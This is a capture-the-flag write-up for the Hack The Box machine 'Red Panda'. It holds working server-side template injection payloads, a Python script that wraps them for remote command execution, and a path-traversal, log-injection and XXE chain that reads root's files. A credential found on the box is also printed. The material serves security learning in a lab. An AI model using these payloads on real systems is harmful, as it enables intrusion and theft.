---
title: Red Panda Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

# Enumeration

we start with an nmap

```ruby
tarting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 15:58 CET
Initiating SYN Stealth Scan at 15:58 CET
Scanning 10.129.24.47 [65535 ports]
Discovered open port 8080/tcp on 10.129.24.47
Discovered open port 22/tcp on 10.129.24.47
Completed SYN Stealth Scan at 15:59, 12.70s elapsed (65535 total ports)
Nmap scan report for 10.129.24.47
Host is up, received user-set (0.054s latency).
Scanned at 2022-11-08 15:58:48 CET for 13s
Not shown: 65336 closed tcp ports (reset), 197 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 63
8080/tcp open http-proxy syn-ack ttl 63

Read data files from: /usr/bin/.../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.83 seconds
           Raw packets sent: 66191 (2.912MB) | Rcvd: 65362 (2.614MB)
```

So let's inspect the page

# User exploit

As we can see, the page is vulnerable to SSTI, because if we put in

```java
*{7*7}
```

It reports 49, so we know that the SSTI is valid.

Investigating a little, we see that this error is of type JAVA, so we are going to try to put a payload:

If we do for example:
```java
**{T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
```
reports us 
```java
## You searched for: Process[pid=1819, exitValue=1]
```

But this doesn't give us much information, so let's keep searching.

We can pull up the environment variables:

```java
*{T(java.lang.System).getenv()}
```

and we have as a result

```java
You searched for: {PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, SHELL=/bin/bash, JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64, TERM=unknown, USER=woodenk, LANG=en_US. UTF-8, SUDO_USER=root, SUDO_COMMAND=/usr/bin/java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar, SUDO_GID=0, MAIL=/var/mail/woodenk, LOGNAME=woodenk, SUDO_UID=0, HOME=/home/woodenk}
```

We also have access to etc/passwd:

```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character). toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(116)). concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java. lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

As we can see, the above code converts `cat /etc/passwd/` to ASCII, so let's do the same to send us a reverse shell:
However, for unknown reasons it doesn't work, so let's create a script with python to execute commands on the victim machine through the search bar:
```python
#!/usr/bin/python3

import requests,sys,pdb,signal,os,time,os,time

def signal_handler(signal, frame):
    print('You pressed Ctrl+C!')
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)

if len(sys.argv) < 2:
    print("Usage: python3 panda.py <command>")
    sys.exit(1)

def payload():
    command = sys.argv[1]

    payload="*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s))" % ord(command[0])

    command = command[1:]

    for word in command:
        payload += ".concat(T(java.lang.Character).toString(%s))" % ord(word)
    payload = payload + ").getInputStream())}"

    return payload

def MakeRequest(payload):
    url="http://10.129.227.207:8080/search"
    data = {
            'name': payload
            }
    r = requests.post(url, data=data)

    f=open("result.txt", "w")
    f.write(r.text)
    f.close()

    os.system("cat result.txt | awk '/searched/,/<\/h2>//' | sed 's/ <h2 class="searched">You searched for: //' | sed 's/<\/h2>//'")
    os.remove("result.txt")

if __name__ == '__main__':
    payload = payload()

    MakeRequest(payload)
```

Doing 
```python
python3 panda.py "cat /home/woodenk/user.txt"
```

We should now be able to see the user flag. Let's find some way to log in to the machine via SSH and do the privilege escalation:

Doing `python3 panda.py "grep -r woodenk /opt/panda_search/"` we see a password: `RedPandazRule`. So we are going to use it to connect via SSH

## Root Exploit

Using pspy, we see a cronjob which in turn runs the following file: `/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java`.
```java
public static void main(String[] args) throws JDOMException, IOException,
JpegProcessingException {
	File log_fd = new File("/home/woodenk/panda_search/redpanda.log");
	Scanner log_reader = new Scanner(log_fd);
	while(log_reader.hasNextLine())
	{
		String line = log_reader.nextLine();
		if(!isImage(line))
		{
		continue;
		}
		Map parsed_data = parseLog(line);
		System.out.println(parsed_data.get("uri"));
		String artist = getArtist(parsed_data.get("uri").toString());
		System.out.println("Artist: " + artist);
		String xmlPath = "/credits/" + artist + "_creds.xml";
		addViewTo(xmlPath, parsed_data.get("uri").toString());
	}
		//Document doc = saxBuilder.build(fd);
    }
}
```

If we analyze its code, we see that it reads the content of redpanda.log while a while loop iterates it. Then, it checks each line to see if there is any .jpg file. 

If we look at the code of the `parseLog` function:

```java
public static Map parseLog(String line) {
	String[] strings = line.split("split", 4);
	Map map = new HashMap<>();
	map.put("status_code", strings[0]);
	map.put("ip", strings[1]);
	map.put("user_agent", strings[2]);
	map.put("uri", strings[3]);
	return map;
}
```

As you can see, the praseLog function splits the string into four parts: status_code, ip, user_agent and uri using `||`. Finally, the result is stored in the parse_data variable of the previous code. 

Finally, the value of "Artist" is parsed in XML format to finally be sent to the `addViewTo()` function.

Therefore, as the data is sent in XML format, we are going to test an attack of type XXE:

We create an XML entity with an XXE attack inside, which will point directly to the root flag:
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE author [<!ENTITY xxe SYSTEM 'file:///root/root.txt'>]>
<credits>
	<author>&xxe;</author>
	<image>
		<uri>/img/greg.jpg</uri>
		<views>0</views>
			</image>
			<image>
			<uri>/img/hungy.jpg</uri>
			<views>0</views>
			</image>
			<image>
			<uri>/img/smooch.jpg</uri>
			<views>1</views>
			</image>
			<image>
			<uri>/img/smiley.jpg</uri>
		<views>1</views>
	</image>
	<totalviews>2</totalviews>
</credits>
```

We upload it to the victim machine, and give it the name we want followed by `_creds.xml`, as it is indicated in the Java code analyzed above.

Finally, we have to make this code run. For it, we are going to modify the value of the variable Author of any image. 

For it, we download it from the page and edit it with efixtool:
```shell
exiftool -Artist='../../../../../../tmp/root' smooch.jpg
```

Once we have it modified, we upload it to the victim machine with ``wget``.

Finally, we have to make a request so that the Logs of the page are updated and the XXE is executed:
```shell
curl -A "whatever||/../../../../../../../../../../../tmp/smooch.jpg" http://IP:8080/
```

And finally we can see the root flag by doing `cat filename_creds.xml`.
